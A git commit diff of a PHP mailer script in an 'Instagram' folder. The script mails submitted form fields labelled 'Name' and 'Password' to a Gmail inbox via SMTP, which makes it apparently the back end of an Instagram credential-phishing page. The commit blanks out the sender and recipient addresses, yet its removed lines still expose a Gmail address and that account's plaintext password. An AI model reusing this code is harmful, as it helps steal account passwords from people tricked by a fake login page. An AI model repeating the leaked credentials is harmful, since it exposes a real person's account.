c5949622c09151e536576e4dda9e29c4198ae2c9
K.S.Sabari Nathan <68042285+sabarinathan145@users.noreply.github.com>
2021-06-14 13:42:30 +0530

    Update sendemail.php

--- Instagram/sendemail.php
+++ Instagram/sendemail.php
@@ -18,16 +18,16 @@ if(isset($_POST['submit'])){
     $mail->isSMTP();
     $mail->Host = 'smtp.gmail.com';
     $mail->SMTPAuth = true;
-    $mail->Username = 'sabari.rishi32@gmail.com'; // Gmail address which you want to use as SMTP server
-    $mail->Password = 'sabarinathanks33'; // Gmail address Password
+    $mail->Username = ' '; // Gmail address which you want to use as SMTP server
+    $mail->Password = ' '; // Gmail address Password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
     $mail->Port = '587';
 
-    $mail->setFrom('sabari.rishi32@gmail.com'); // Gmail address which you used as SMTP server
-    $mail->addAddress('sabari.rishi33@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
+    $mail->setFrom('   '); // Gmail address which you used as SMTP server
+    $mail->addAddress('   '); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
 
     $mail->isHTML(true);
-    $mail->Subject = 'Message Received (Contact Page)';
+    $mail->Subject = '  '; // Message to get as Subject in your received mail
     $mail->Body = "<h3>Name : $name <br>Password: $email </h3>";
 
     $mail->send();
